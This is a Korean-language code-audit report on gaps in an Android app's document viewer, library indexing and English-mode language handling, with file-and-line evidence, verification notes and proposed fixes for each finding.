- 제안: LibraryIndexer.readLines 가 '일부만 읽음' 여부(잘림·건너뛴 시트 수)를 함께 돌려주고, 문서 행에 표시를 남긴다 — 가장 작게는 LibraryDocument.error 자리에 PARTIAL 같은 코드를 READY 와 함께 저장해 보관함 줄에 '앞부분만 색인됨'을 보인다(스키마 변경 없이 기존 error 열 재사용 가능한지 확인). 더 나은 방법은 색인 경로에서만 DocumentLimits 를 보관함 상한에 맞게 넓힌 값으로 여는 것(DocumentOpener.open 에 limits 인자). 테스트: 잘린 FlowDocument·실패 시트를 주는 가짜 opener 로 표시가 남는지.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:136 — 읽기 모드 문서의 blocks 만 쓰고 document.truncated(2만 블록 상한)는 보지 않는다
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:138-141 — 시트 읽기가 실패하면 mapNotNull 로 조용히 건너뛰고, sheet.truncated(2만 행·40만 칸 상한)도 보지 않는다
  - domain/src/main/java/com/kosmos/app/domain/document/DocumentSupport.kt:47-53 — 상한 값(행 20,000 · 칸 400,000 · 블록 20,000)
  - domain/src/main/java/com/kosmos/app/domain/document/CsvReader.kt:99, 113-116 — csv 도 2만 행에서 끊고 truncated 만 세운다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentHomeScreen.kt:285 — 보관함 줄은 조각 수·글자 수만 보인다(잘림 표시 없음)
  - domain/src/main/java/com/kosmos/app/domain/library/LibraryChunker.kt:33-34 — 보관함이 약속한 크기는 문서당 200만 자
- 검증: 직접 확인. LibraryIndexer.kt:136 은 opened.document.blocks 만 쓰고 truncated 를 안 본다. :138-141 은 시트 읽기 실패를 mapNotNull 로 버리고 sheet.truncated 도 안 본다. PDF 도 :148 text(i) 가 null 인 쪽은 조용히 빠진다(DocumentOpener.kt:346-348 이 실패를 null 로). 상한은 DocumentSupport.kt:47-53(행 2만·칸 40만·블록 2만), CsvReader.kt:99, 113-116(2만 행에서 끊고 truncated). domain/library 와 LibraryIndexer 에 truncated·PARTIAL 은 grep 0건이고 LibraryFailure(LibraryRepository.kt:14-25)에도 부분 상태가 없다. 보관함 줄(DocumentHomeScreen.kt:285)은 조각 수·글자 수만 보인다. 뷰어는 잘림을 알린다(SheetView.kt:100-107, FlowView.kt:93-101) — 비대칭 맞음. 보충: 블록 상한은 표 칸 안 문단까지 센다(FlowDocument.kt:84-90) — 표가 많은 긴 문서는 더 빨리 걸린다. 문서당 200만 자 약속(LibraryChunker.kt:33)보다 뷰어용 상한이 먼저 걸릴 수 있다는 주장은 타당하나, 실제 책 한 권이 2만 블록을 넘는지는 재 보지 않은 추정.
- 앞선 기록: CHANGELOG 0.41.0 M3(실패 사유 코드). 부분 색인·잘림 표시에 대한 기록은 CHANGELOG·architecture·plans 에 없음

### gap-docpipeline-6 · 같은 파일을 보관함에 두 번 넣을 수 있고, 하나를 빼면 남은 쪽의 읽기 권한까지 반납된다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 색인이 '중단됨'·'실패'로 보일 때 사용자가 같은 파일을 한 번 더 추가하는 것은 자연스러운 행동이다. 그러면 같은 조각이 두 벌 색인돼 검색 결과 자리를 두 배로 차지하고 전체 글자 상한도 두 배로 쓴다. 중복을 정리하려고 하나를 빼면 남은 문서는 원문 열기가 '원본을 찾을 수 없음'이 되고 다시 색인도 실패한다(파일 고르기로 받은 권한은 다시 받을 수 없다는 것이 코드 주석 :122 에 적혀 있다).
- 제안: onLibraryPicked 에서 library.observeDocuments().first() 로 같은 uri 문서를 찾으면 새로 넣지 않고 indexer.reindex(기존 문서)를 부른다(사용자에게는 '다시 색인' 으로 보임). removeLibrary 의 반납 조건에 '다른 보관함 문서가 같은 uri 를 쓰지 않을 때'를 추가한다. DocumentHomeViewModelTest 에 두 경우 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/document/DocumentHomeViewModel.kt:142-153 — onLibraryPicked 는 같은 URI 가 이미 보관함에 있는지 보지 않는다
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:72-78 — add 는 매번 새 UUID 로 문서를 만든다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentHomeViewModel.kt:177-183 — removeLibrary 는 '최근 문서에 없으면' 권한을 반납한다. 같은 URI 의 다른 보관함 문서는 확인하지 않는다(:193-195 의 최근 문서 쪽 검사와 비대칭)
  - app/src/main/java/com/kosmos/app/platform/document/DocumentAccess.kt:54-56 — 반납은 URI 단위라 되돌릴 수 없다
- 검증: 직접 확인. DocumentHomeViewModel.kt:142-153 onLibraryPicked 는 기존 보관함 문서를 조회하지 않고 indexer.add 를 부른다. LibraryIndexer.kt:72-78 은 매번 새 UUID, LibraryEntities.kt:10-14 library_document 에 uri 유일 제약·색인이 없다. :177-183 removeLibrary 는 최근 문서 목록만 보고 access.release 를 부른다 — 같은 uri 의 다른 보관함 문서는 확인 안 함(:193-195 의 반대 방향 검사와 비대칭). DocumentAccess.kt:54-56 반납은 uri 단위. 반납 뒤 남은 문서는 hasAccess(:51-52)가 false 라 openLibrary(:160-162)가 '원본을 찾을 수 없음'을 내고 다시 색인도 열기 실패. 같은 파일을 고르면 파일 고르기가 같은 uri 를 준다는 전제는 일반적인 동작이지만 직접 돌려 보지는 않았다. 조각이 두 벌 생겨 검색 자리·전체 글자 상한(LibraryIndexer.kt:110-114)을 두 배로 쓰는 것도 코드상 맞다. 관련 테스트 없음(grep 0건).
- 앞선 기록: CHANGELOG 0.41.0 M3 '최근 문서와 보관함이 같은 영구 권한을 나눠 쓴다'(한 방향만 다룸), plans/0.34.0:95 '최근 문서는 같은 uri 면 갱신'. 보관함 안 중복 기록 없음

### gap-docpipeline-7 · 워드·한글 문서의 큰 표는 통째로 목록 한 칸이라 한 번에 전부 그린다
- 판정 일부만 맞음 · 중요도 중간 · 크기 M
- 왜: 한글 공문서·서식은 문서 전체가 표 하나이거나 수백 행짜리 명단 표인 경우가 많다. 이때 '보이는 블록만 그린다'는 설계가 통하지 않아 표가 화면에 들어오는 순간 수천 개의 글자 상자를 한 프레임에 만들고 두 번씩 잰다. 휴대폰에서 스크롤이 멈추거나 응답 없음으로 이어질 수 있다. 엑셀 쪽은 1만 행을 실측했지만(CHANGELOG 0.34.0) 읽기 모드의 큰 표는 측정 기록이 없다. 실제 수치는 재 보지 않은 추정이다.
- 제안: FlowView 에서 표 블록을 행 단위 항목으로 펼친다 — LazyColumn 에 블록 대신 '그릴 항목(블록 또는 표의 한 행)' 목록을 만들고, 표 행들은 같은 가로 스크롤 상태를 공유한다(SheetView 가 이미 쓰는 방식). initialBlock·selectedBlocks 는 블록 번호 → 첫 항목 번호 맵으로 옮긴다. 먼저 에뮬레이터에서 500행 × 8열 표 문서로 느린 프레임을 재서 필요성을 확인하고 진행한다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/document/FlowView.kt:101-103 — 블록 하나가 LazyColumn 항목 하나
  - app/src/main/java/com/kosmos/app/feature/document/FlowView.kt:144-154 — FlowTable 은 모든 행을 일반 Column 으로 그리고 행마다 IntrinsicSize.Min(측정 두 번)
  - app/src/main/java/com/kosmos/app/feature/document/FlowView.kt:157-175 — 칸마다 Box + Text, 칸 너비는 120dp × 가로 병합 수(최대 64, FlowDocument.kt:135)
  - domain/src/main/java/com/kosmos/app/domain/document/FlowDocument.kt:84-90 — 블록 상한은 표 하나를 1로 센다(표 안 행·칸 수 상한 없음)
- 검증: 구조는 맞다. FlowView.kt:101-103 블록 하나가 목록 항목 하나, :144-154 FlowTable 은 모든 행을 일반 Column 으로 그리고 행마다 height(IntrinsicSize.Min), :157-175 칸마다 Box+Text. 틀린 곳: '블록 상한은 표 하나를 1로 센다(표 안 행·칸 수 상한 없음)' — FlowDocument.kt:84-90 의 add 는 표 칸 안에 들어가는 문단도 같은 count 로 세므로 표 안 문단 합계는 2만(DocumentSupport.kt:52)에서 끊긴다. 상한이 없는 것은 빈 칸·행 수 자체뿐. 그래도 최대 2만 개 가까운 글자 상자가 항목 하나에서 한 번에 만들어질 수 있어 위험 자체는 유효. 실제로 멈추는지는 재 본 적 없는 추정이므로 제안대로 에뮬레이터에서 500행 표로 먼저 재고 결정하는 것이 맞다(성능 수치만 휴대폰).
- 앞선 기록: CHANGELOG 0.34.0 [Perf](엑셀 1천·1만 행 실측), 0.35.0(읽기 모드 도입). FlowTable·IntrinsicSize·읽기 모드 큰 표 성능 기록은 grep 0건

### gap-docpipeline-8 · 행 번호가 겹치는 엑셀 파일을 열면 표 목록의 키가 겹쳐 앱이 죽는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 정상 엑셀은 행 번호가 겹치지 않지만, 다른 프로그램이 내보냈거나 깨진 파일에서는 같은 번호의 row 가 두 번 나올 수 있다. 그런 파일은 '손상됐어요' 안내가 아니라 뷰어가 꺼진다. 같은 종류의 크래시(목록 키 중복)를 이 프로젝트에서 이미 두 번 겪었다.
- 제안: XlsxReader.SheetHandler.flushRow 에서 같은 행 번호가 이미 있으면 그 행의 칸에 합치거나(뒤에 온 칸 우선) 뒤의 것을 버린다 — 리더가 '행 번호는 유일하다'를 보장하게 한다(Sheet KDoc 의 '행 번호 오름차순' 약속과 맞춤). XlsxReaderTest 에 같은 r 을 가진 row 두 개 사례 추가.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/document/XlsxReader.kt:292 — 행 번호는 파일의 r 속성을 그대로 믿는다(없으면 앞 행 + 1)
  - domain/src/main/java/com/kosmos/app/domain/document/XlsxReader.kt:342-346, 370 — 같은 번호의 행이 두 번 나와도 둘 다 담고 정렬만 한다
  - app/src/main/java/com/kosmos/app/feature/document/SheetView.kt:118 — items(bodyRows, key = { it.index }) — 같은 키가 함께 그려지면 Compose 가 IllegalArgumentException 을 던진다
- 검증: 직접 확인. XlsxReader.kt:292 행 번호는 r 속성 그대로(없으면 앞+1 — r 있는 행과 없는 행이 섞여도 겹칠 수 있음). :342-346 flushRow 는 중복 검사 없이 추가, :370 은 정렬만. SheetView.kt:88 partition 뒤 :118 items(bodyRows, key = { it.index }) — 같은 번호 두 행은 정렬 뒤 붙어 있어 함께 그려지고 Compose 가 키 중복 예외를 던진다. 틀 고정 행 쪽(:112-114 forEach)은 키가 없어 무관. 리더 테스트에 같은 r 사례 없음(grep 0건). 강도는 낮춘다: 정상 엑셀·한셀·구글 시트는 행 번호가 겹치지 않아 깨진 파일이나 비표준 내보내기에서만 난다. 고치는 비용이 작고 '손상 파일은 죽지 않고 안내한다'는 설명과 맞추는 의미.
- 앞선 기록: CHANGELOG:934 '페이징 앞쪽 로드 중복 → LazyColumn 중복 키 크래시', :1567 Memory 탭 중복 키(다른 화면의 같은 종류). 엑셀 행 번호 중복 기록 없음

### gap-docpipeline-9 · csv 는 칸 하나·한 줄의 크기 상한이 없다 — 닫히지 않은 따옴표 하나로 나머지 파일 전체가 한 칸이 된다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 로그·내보내기 파일에는 칸이 따옴표로 시작하고 닫히지 않는 줄이 섞이는 일이 있다. 그러면 그 뒤 수 MB 가 한 칸이 되어 뷰어가 열 너비를 재다 멈추거나, 보관함 색인에서 한 줄이 수백만 자가 된다. 한 줄에 칸이 수백만 개인 파일은 메모리가 먼저 무너진다. 흔한 파일은 아니지만 '손상·비정상 파일을 상한으로 막는다'는 설계 설명에서 csv 만 빠져 있다. 뷰어가 실제로 멈추는지는 돌려 보지 않았다.
- 제안: CsvReader.parse 에 (1) 칸 길이 상한(엑셀과 같은 32,767자 — 넘으면 그 칸을 거기서 끊고 truncated), (2) limits.maxCells 적용(넘으면 그 행까지만 담고 truncated)을 넣는다. readCapped 는 줄바꿈이 없을 때 UTF-8 글자 경계까지 뒤로 물러나 자른다. SheetView 는 그릴 글자를 앞 몇백 자로 잘라 넘긴다(전체는 길게 눌러 보기에서). DocumentParsingTest 에 닫히지 않은 따옴표·줄바꿈 없는 긴 줄 사례 추가.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/document/CsvReader.kt:105-110 — 칸 맨 앞의 따옴표로 따옴표 모드에 들어가면 닫는 따옴표가 나올 때까지 줄바꿈까지 전부 한 칸에 담는다(최대 20MB)
  - domain/src/main/java/com/kosmos/app/domain/document/CsvReader.kt:84-101 — 행 상한(maxRows)만 있고 칸 수 상한(maxCells)은 csv 에 적용되지 않는다. 줄바꿈 없는 20MB 한 줄이면 칸 객체 수백만~천만 개
  - app/src/main/java/com/kosmos/app/feature/document/SheetView.kt:275-288 — 열 너비를 정하려고 칸 글자(첫 줄 전체)를 메인 스레드에서 실제 글꼴로 잰다
  - app/src/main/java/com/kosmos/app/feature/document/SheetView.kt:244-250 — 칸 글자를 통째로 Text 에 넘긴다(한 줄 말줄임이지만 문자열 전체가 레이아웃 대상)
  - domain/src/main/java/com/kosmos/app/domain/document/CsvReader.kt:38-42 — 바이트 상한에서 줄바꿈을 못 찾으면 바이트 중간에서 끊어 UTF-8 판정이 실패하고 파일 전체가 CP949 로 읽힌다
- 검증: 직접 확인. CsvReader.kt:103-110 — 칸 맨 앞 따옴표로 들어가면 닫는 따옴표까지 줄바꿈 포함 전부 한 칸. :84-101 endField·endRow 에 칸 수·칸 길이 상한이 없고 limits.maxCells 는 csv 에서 쓰이지 않는다(행 상한 :99 만). :38-42 줄바꿈을 못 찾으면 cap 바이트에서 그대로 잘라 UTF-8 엄격 디코딩(:53-61)이 실패하면 전체가 CP949 로 읽힌다 — 줄바꿈 없는 20MB 초과 파일에서만. SheetView.kt:244-250 은 칸 글자 전체(줄바꿈만 공백으로)를 Text 에 넘기고, :275-288 은 앞 200행 칸의 첫 줄을 실제 글꼴로 잰다(열마다 후보 3개). 다만 '뷰어가 멈춘다'는 실행해 보지 않은 추정이고, 보관함 쪽은 LibraryIndexer.kt:106-109 의 200만 자 상한이 거절해 준다. 흔치 않은 비정상 파일이라 low 유지.
- 앞선 기록: CHANGELOG 0.34.0(csv 20MB·2만 행 상한, CP949 폴백). 칸 길이·칸 수 상한·닫히지 않은 따옴표 기록은 grep 0건

### gap-docpipeline-10 · 목록에서 빼기의 마무리(색인 삭제·권한 반납)가 화면 수명에 묶여 있다 — 되돌리기 시간 안에 화면을 떠나면 마무리가 빠진다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
- 왜: 문서를 빼고 10초 안에 뒤로 가면 화면이 사라지며 ViewModel 스코프도 곧 취소된다. 그때 마무리 코루틴이 중간에서 끊기면 영구 읽기 권한이 반납되지 않고 남는다(기기당 상한이 있는 자원이고 다시 정리할 길이 없다). 화면 정리와 ViewModel 정리의 순서에 따라서는 보관함 삭제 자체가 시작되지 않아, 뺐다고 생각한 문서가 다음에 다시 보이고 그동안 채팅 검색에도 계속 잡힌다. 어느 쪽으로 끝나는지는 내비게이션 정리 순서에 달려 있어 코드만으로는 확정하지 못했다(에뮬레이터에서 '빼기 → 바로 뒤로'로 확인 필요). 코드 주석(:114)은 'finally 의 remove 는 viewModelScope 에서 돈다'고만 가정한다.
- 제안: 마무리를 화면·ViewModel 수명과 떼어 앱 스코프로 옮긴다 — LibraryIndexer.remove 가 삭제 뒤 권한 반납 판단까지 하도록 하고(최근 문서·다른 보관함 문서가 같은 uri 를 쓰는지 확인 — gap-docpipeline-6 과 같이 고침), 최근 문서 쪽도 같은 앱 스코프 도우미를 쓴다. 추가 안전망으로 문서 홈을 열 때 persistedUriPermissions 중 최근 문서·보관함 어디에도 없는 uri 를 반납하는 정리를 한 번 돌린다. 테스트: viewModelScope 를 취소한 뒤에도 삭제·반납이 끝나는지.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/document/DocumentHomeScreen.kt:110-127, 130-143 — 마무리는 화면의 rememberCoroutineScope 코루틴의 finally 에서 viewModel.remove / removeLibrary 를 부른다(스낵바는 약 10초, KosmosList.kt:179-180)
  - app/src/main/java/com/kosmos/app/feature/document/DocumentHomeViewModel.kt:134-139 — remove 는 viewModelScope 에서 store.remove 뒤에 권한 반납
  - app/src/main/java/com/kosmos/app/feature/document/DocumentHomeViewModel.kt:177-183 — removeLibrary 는 viewModelScope 에서 삭제를 기다린(join) 뒤에야 권한을 반납한다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentHomeViewModel.kt:69, 168-174 — 보관함의 '숨김'은 ViewModel 메모리에만 있다
  - app/src/main/java/com/kosmos/app/platform/document/DocumentAccess.kt:51-52 — 남은 영구 권한을 목록과 맞춰 정리하는 코드는 없다(persistedUriPermissions 는 hasAccess 에서만 읽음)
- 검증: 구조는 확인. DocumentHomeScreen.kt:110-127, 130-143 — 마무리가 화면 rememberCoroutineScope 코루틴의 finally 에서 viewModel.remove / removeLibrary 호출. 화면은 내비게이션 목적지(AppNavHost.kt:188-192)라 뒤로 가면 뷰모델도 곧 정리된다. DocumentHomeViewModel.kt:134-139 remove 는 store.remove(중단 지점) 뒤에 반납, :177-183 removeLibrary 는 join 뒤에 반납 — 뷰모델 스코프가 중간에 취소되면 반납이 빠진다. 숨김은 메모리에만(:69), 남은 영구 권한을 정리하는 코드 없음(DocumentAccess.kt:51-56 — 조회는 hasAccess 뿐). 확인 못 한 부분: '보관함 삭제 자체가 시작되지 않아 문서가 다시 보인다'는 화면 정리와 뷰모델 정리의 순서에 달려 있어 코드만으로 확정 불가. 화면 정리가 먼저면 indexer.remove 가 앱 스코프(LibraryIndexer.kt:87)에서 끝까지 돌아 삭제는 되고 반납만 빠진다. 반납 누락의 실제 피해는 쓰이지 않는 읽기 권한 몇 개가 남는 정도라 low. 확정되는 작은 빈틈 하나: 되돌리기 10초 안에 프로세스가 죽으면 보관함 문서는 지워지지 않은 채 다시 보인다(숨김이 메모리뿐). 에뮬레이터에서 '빼기 → 바로 뒤로' 확인 후 진행할 것.
- 앞선 기록: CHANGELOG:735(0.38.3 M4 '읽기 권한은 되돌리기 시간이 끝난 뒤 반납'), plans/0.38.4:13(스낵바 약 10초 — 반납도 그만큼 늦어짐). 화면을 떠나는 경우의 기록 없음

<details><summary>읽은 범위</summary>

[직접 끝까지 읽은 파일] domain/document: XlsxReader·XlsxNumberFormat(45행 이후)·HwpxReader·DocxReader·CsvReader·FlowDocument·DocumentSupport·DocumentText·Sheet. domain/library: LibraryChunker·LibrarySemantic·LibrarySearch·LibraryRepository. data: LibraryRepositoryImpl·LibraryDao·LibraryEntities. app/platform/document: LibraryIndexer·LibraryEmbedder·DocumentOpener·DocumentAccess. app/feature/document: SheetView·FlowView·PdfView·DocumentViewerScreen(전체)·DocumentViewerViewModel·DocumentViewerActivity(40행 이후)·ViewerTarget·DocumentHomeViewModel·DocumentHomeScreen. 관련해서 부분만 본 것: SearchDocumentsToolExecutor(85~135행)·DocSourceViewModel·KosmosApp(onStop 부근)·BigramMatcher.bigrams·KosmosList.showUndo.
[읽지 않은 것] CellStyle.kt·CellPaint.kt·DocumentType.kt·RecentDocuments.kt·DocumentTextExtractor.kt·ContentNames.kt 본문, 테스트 파일 본문(이름·일부 줄만 grep), AppNavHost 의 화면 정리 순서. gradle·테스트·에뮬레이터는 규칙대로 돌리지 않았다 — 2·3·7·9·10번은 코드로 경로를 설명했지만 실제 재현은 하지 않아 confidence=medium.
[기록 대조] docs/CHANGELOG.md·architecture.md·docs/plans·device_gate.md 를 열쇠말로 grep 했다(200열 상한, 출처 카드, 되돌리기, 0.41.14 색인 중 삭제, 0.41.16 벡터 경합, 중복 키 크래시 등).
[확인했지만 문제없다고 본 것] 조각 나누기의 글자 단위 자르기(빠지거나 겹치는 글자 없음), PDF 쪽 번호(빈 쪽을 건너뛰어도 원래 쪽 번호 유지), 색인 중 삭제(0.41.14 에서 막음), 임베딩 중 재색인(0.41.16 에서 막음), 뷰어 회전 시 위치(목록 상태·확대 배율이 저장됨), 시트 탭 전환 시 스크롤 초기화, FTS 질의 연산자 주입(토큰이 글자·숫자뿐).
[10건을 넘겨 뺀 것 5건] ① 한글(hwpx) 암호·배포용 문서가 '암호' 안내가 아니라 '손상됨'으로 보일 가능성(HwpxReader 에 암호화 감지 없음 — 파일 구조를 직접 확인하지 못해 뺌). ② 워드 문서의 글상자·도형 글이 호환용 사본 때문에 두 번 읽힐 가능성(DocxReader 에 AlternateContent/Fallback 처리 없음 — 추정). ③ 엑셀 숫자 칸의 값이 '1E999999999' 같은 조작된 지수면 숫자 서식 적용 중 메모리가 터질 수 있음(XlsxNumberFormat.kt:73-77, 99-108 — 조작된 파일에서만). ④ 앱이 백그라운드로 가면 뜻 벡터 만들기가 취소되고 자동으로 이어지지 않아, 문서 화면에서 '준비하기'를 누를 때까지 보관함 전체가 글자 검색으로 돌아감(KosmosApp.kt:111-112 — 사용자 결정으로 일부러 그렇게 둔 것이라 뺌). ⑤ PDF 에서 조문이 쪽을 넘어가면 뒷쪽 조각에 조문 번호·제목이 붙지 않음(LibraryChunker.kt:154-157 — '조각은 쪽을 넘지 않는다'는 설계의 부작용, 영향 작음). 그 밖에 색인이 중단되면 처음부터 다시 해야 하는 점, 실패 상태 문서의 옛 조각이 계속 검색되는 점은 영향이 작아 뺐다.

</details>

## 영어 모드 전체 흐름의 한/영 비대칭 (gap-english)

### gap-english-1 · 낭독 음성을 '글의 언어'가 아니라 '설정 언어'로 골라, 다른 언어로 쓰인 답을 맞지 않는 음성으로 읽는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 언어를 한국어→영어로 바꾸면 그 전의 한국어 답 전부가, 그리고 영어 설정에서 한국어로 주고받은 답이 영어 음성으로 넘어간다(반대 방향도 같다). 엔진에 따라 한글을 건너뛰거나 엉뚱하게 읽고, 앱은 '읽기 시작함'으로 처리해 안내도 뜨지 않는다. 자동 낭독을 켠 채 두 언어를 섞어 쓰면 매 답마다 생긴다. 영어 시연(포트폴리오)에서 바로 드러나는 자리다. 엔진이 실제로 어떻게 읽는지는 기기에서 확인하지 못했다(코드 경로만 확인).
- 제안: speak() 에서 낭독할 글에 ContentLanguage.detect(text, fallback = 설정 언어)를 적용해 그 메시지의 언어로 음성을 고른다(selectOfflineVoice 에 언어 코드를 인자로). 그 언어의 오프라인 음성이 없으면 지금처럼 읽지 않고 '이 언어 음성이 없어요' 안내를 띄운다. 설정 화면의 음성 상태 확인(prepare)은 설정 언어 기준 그대로 둔다. SpeechOutputTest 에 '영어 설정 + 한국어 글 → 한국어 음성' 경우를 더한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:79-82 — speak() 가 읽을 글은 보지 않고 targetLangCode()(설정 언어)만 비교해 음성을 다시 고른다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:180-197 — targetLangCode 는 currentLanguage.current 하나만 보고, 그 언어 음성만 setVoice
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:141-145 — 시스템 지시가 "unless the user speaks another language" 라서 영어 설정에서도 한국어로 물으면 한국어 답이 나오는 것이 정상 동작
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:705-719 — 말풍선 재생 버튼은 저장된 어떤 메시지든(언어 전환 전 것 포함) 같은 speak() 로 보낸다
- 검증: 코드 경로는 주장대로다. SpeechOutput.kt:74-93 speak() 는 읽을 글을 보지 않고 79행에서 selectedLangCode != targetLangCode() 만 비교하며, 180-181행 targetLangCode 는 currentLanguage.current 하나만 본다. 183-197행 selectOfflineVoice 도 그 언어 음성만 고른다. PromptAssembler.kt:142-146 은 'unless the user speaks another language' 라 설정과 다른 언어의 답이 정상 동작이고, ChatViewModel.kt:705-710 toggleSpeak 은 어떤 저장 메시지든 같은 speak() 로 보낸다. speak() 가 true 를 돌려주면 안내도 뜨지 않는다(710행). 다만 심각도는 낮춘다: 엔진이 맞지 않는 글을 실제로 어떻게 읽는지는 코드로 확인할 수 없고(기기 미확인), 주 사용 방향(한국어 설정 + 영어 낱말이 섞인 답)에서 문제가 생긴다는 근거는 없다. 걸리는 것은 영어 설정에서 한국어 글을 읽는 경우, 즉 영어 시연 쪽이다. 고칠 때 주의: selectedLangCode 캐시(56·79·191행)가 '설정 언어' 기준이라 메시지별 언어로 바꾸면 prepare()(99-106행)와 상태값을 공유하지 않게 나눠야 하고, VoiceStatus.NO_KOREAN_OFFLINE_VOICE 이름과 안내 문구(chat_tts_no_voice_notice)도 언어 중립인지 같이 봐야 한다.
- 앞선 기록: CHANGELOG 0.40.0 M2b(584행)·docs/plans/0.40.0-english-mode.md:91 — '설정이 영어면 영어 음성으로 전환'이 설계였다. 글의 언어와 설정이 다른 경우를 따져 본 기록은 없음. CHANGELOG 589행 실기기 확인 ① 영어 낭독은 미확인.

### gap-english-2 · 요약·사실 추출·기억 합치기의 '애매하면 설정 언어' 폴백이 실제로는 연결되지 않아 항상 한국어로 떨어진다 (기본값 KO 인자가 누락을 숨김)
- 판정 확인됨 · 중요도 낮음 · 크기 M · 모델 입력
- 왜: 영어 설정 사용자의 대화가 한글·영어가 섞였거나(예: 한국어 낱말을 묻는 영어 대화) 글자가 거의 없으면(숫자·기호 위주) 한국어 지시문으로 요약돼 서랍의 제목·태그·요약과 자동 저장 메모가 한국어로 남는다. 문서와 ADR-033 이 말하는 동작과 코드가 다르다는 점은 면접에서 지적받기 쉽다. 더 큰 문제는 같은 모양의 기본값(= AppLanguage.KO / CurrentLanguage.KO)이 운영 코드 서명 약 70곳에 있어, 새 호출부가 언어를 빼먹어도 조용히 한국어가 된다는 것 — 이번 누락이 그 실제 사례다.
- 제안: ① EpisodeSummarizeScheduler·EpisodeFactExtractor 에 CurrentLanguage 를 주입해 fallbackLang = currentLanguage.current 로 넘기고, EpisodeMerge(판정·재요약)·PlanMemoryMergeUseCase 도 invoke 인자로 폴백 언어를 받아 MemoryCleanupRunner 가 넘긴다. ② 운영 코드가 부르는 유스케이스·도우미의 언어 인자에서 기본값을 걷어 내(테스트는 명시적으로 KO 전달) 누락을 컴파일 오류로 만든다 — 한 번에 다 하기 부담되면 부수 추론 5종부터. 새 문구는 없고 이미 실측한 한/영 지시문 중 어느 쪽을 쓸지만 바뀌지만, 애매한 대화에서 모델 입력이 달라지므로 요약·추출 테스트에 '폴백 EN' 경우를 더한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/util/ContentLanguage.kt:18-20 — 주석: 한글·라틴 비율이 애매하거나 글자가 없으면 fallback(설정 언어)으로 넘어간다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:251 — summarizeEpisode(messages) : fallbackLang 을 넘기지 않아 기본값 AppLanguage.KO
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/episode/EpisodeFactExtractor.kt:83 — extractFacts(messages) : 같은 누락
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/cleanup/EpisodeMerge.kt:83, 178 — ContentLanguage.detect(sample, AppLanguage.KO) 고정, 합친 뒤 다시 요약도 summarizeEpisode(messages) 로 폴백 누락
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/cleanup/PlanMemoryMergeUseCase.kt:106 — ContentLanguage.detect(…, AppLanguage.KO) 고정
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/SummarizeEpisodeUseCase.kt:43-51 — fallbackLang: AppLanguage = AppLanguage.KO 기본값이라 컴파일러가 누락을 잡지 못한다
- 검증: 주장이 맞다. ContentLanguage.kt:20 KDoc 은 '애매하거나 글자가 없으면 fallback(설정 언어)'이라 쓰지만 30행·52행 기본값은 AppLanguage.KO 다. 운영 호출부 전체를 grep 한 결과 폴백을 넘기는 곳이 한 군데도 없다: EpisodeSummarizeScheduler.kt:251 summarizeEpisode(messages), EpisodeFactExtractor.kt:83 extractFacts(messages), EpisodeMerge.kt:83 detect(sample, AppLanguage.KO)·178행 summarizeEpisode(messages), PlanMemoryMergeUseCase.kt:106 detect(…, AppLanguage.KO). SummarizeEpisodeUseCase.kt:45·ExtractFactsUseCase.kt:50 의 fallbackLang 기본값 KO 가 누락을 숨긴다. ContentLanguageTest 는 fallback=EN 을 직접 넘긴 경우만 검증한다. 같은 모양의 기본값은 운영 코드에 83곳(제안의 '약 70곳'보다 많음)이다. 심각도는 낮춘다: 한국어 설정(실사용)에서는 KO 폴백이 곧 올바른 값이라 영향이 없고, 영어 설정에서 한글:라틴 비율이 1배 초과~2배 이하로 섞였거나 글자가 없는 대화에서만 갈린다. 고칠 때 주의: 영어 폴백으로 바뀌면 그 대화의 지시문(모델 입력)이 달라지므로 touchesModelInput=true 표시는 타당하다. 기본값 83곳을 한 번에 걷어내는 것은 범위가 크니 부수 추론 호출부 5곳부터 하는 쪽이 현실적이다.
- 앞선 기록: ADR-033(docs/architecture.md 2155행~) 결정 5 '재료 언어를 따른다', docs/plans/0.40.0-english-mode.md:98 '비율 판정 + 폴백'. 폴백을 설정 언어에 연결하지 않았다는 기록은 CHANGELOG·ADR·plans 어디에도 없음.

### gap-english-3 · 영어 모드의 활동 기록에 모델에게 하는 지시문·내부 인자 이름·한국어 메모가 그대로 보인다
- 판정 확인됨 · 중요도 낮음 · 크기 M
